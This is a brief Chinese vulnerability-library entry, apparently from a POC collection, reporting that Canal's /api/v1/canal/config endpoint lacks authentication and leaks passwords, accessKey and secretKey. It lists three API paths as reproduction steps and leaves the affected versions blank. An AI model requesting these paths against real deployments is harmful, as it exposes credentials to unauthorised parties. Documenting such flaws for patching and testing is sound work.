# Canal存在敏感信息泄露漏洞

### 一、漏洞描述
由于/api/v1/canal/config 未进行权限验证可直接访问，导致账户密码、accessKey、secretKey等一系列敏感信息泄露

### 二、影响版本


### 三、漏洞复现
```plain
/api/v1/canal/config/1/0
```

```plain
/api/v1/canal/config/0/9
```

```plain
/api/v1/canal/instance/1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ulgmpe74leezg156>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
